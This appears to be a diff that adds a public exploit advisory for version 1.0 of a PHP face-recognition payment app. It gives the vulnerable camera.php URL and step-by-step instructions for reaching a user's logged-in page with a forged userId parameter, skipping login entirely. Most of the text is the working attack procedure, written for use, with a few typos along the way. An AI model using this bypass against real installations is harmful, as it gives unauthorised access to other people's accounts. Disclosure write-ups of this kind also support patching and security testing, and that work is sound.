@@ -1,0 +1,22 @@
+# Exploit Title: Horizontal authentication bypass through url in face recognition 
+# Exploit Author: Sahil Prasad
+# Vendor Homepage: https://diyaact.com/php-source-code/face-recognition-php.zip
+# Software Link: https://diyaact.com/php-source-code/face-recognition-php.zip
+# Version: v1.0
+# Tested on: Windows 11, Apache
+
+Description: Horizontal authentication bypass is a vulnerability where an advisory is able to open post login page without authentication and able to get into users account without authentication.
+
+
+Vulnerable Parameters:
+/face-recognition-php/facepay-master/camera.php?userId=1
+
+
+Payload:
+change the url to index.php => camera.php?userId=1 and you will be redirected to this page without doing login
+
+Steps:
+1) Go to website 
+2) Now you redirect to this http://localhost/face-recognition-php/facepay-master/index.php
+3) Now it will ask for you to enter the login credentials , you to have change the url to this http://localhost/face-recognition-php/facepay-master/camera.php?userId=1
+4) After hiting tha url you will directly gor login in the account
